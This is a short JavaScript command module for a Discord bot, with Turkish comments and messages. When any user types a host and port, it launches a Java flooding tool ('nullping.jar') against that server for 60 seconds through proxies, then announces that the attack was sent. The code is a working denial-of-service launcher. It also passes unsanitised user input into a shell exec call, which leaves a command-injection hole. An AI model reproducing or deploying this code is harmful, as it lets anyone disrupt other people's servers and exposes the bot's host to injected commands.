const Discord = require("discord.js"); //lmaoalperenin özel methodu XxXpREmiMumXxX
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec

  {
	exec(`cmd /c java -jar nullping.jar host-${host} port-${port} file-proxies.txt mode-handlerfucker time-60`, (error, stdout, stderr) => {
		if(error != null) {
		}
	});
		message.channel.send(`**ErrorKiller** saldırısı gönderildi, **${host}** port, **${port}** zaman **60** saniye :rocket:`)
	}
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['babanefe'],
  permLevel: 0
}

exports.help = {
  name: 'errorkiller',
}